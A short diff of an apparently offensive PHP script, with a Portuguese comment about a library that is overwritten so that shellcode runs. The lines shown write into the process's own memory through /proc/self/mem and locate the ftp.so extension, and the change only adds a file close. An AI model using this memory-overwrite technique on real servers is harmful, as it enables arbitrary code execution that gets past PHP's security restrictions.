@@ -47,6 +47,7 @@ lib que foi sobrescrita, BOOM, vai executar o shellcode.
 		$mem = fopen("/proc/self/mem","w+");
 		fseek($mem, $position);
 		fwrite($mem, $string);
+		fclose($mem);
 	}
 
 	$range = get_extension_range("ftp.so");
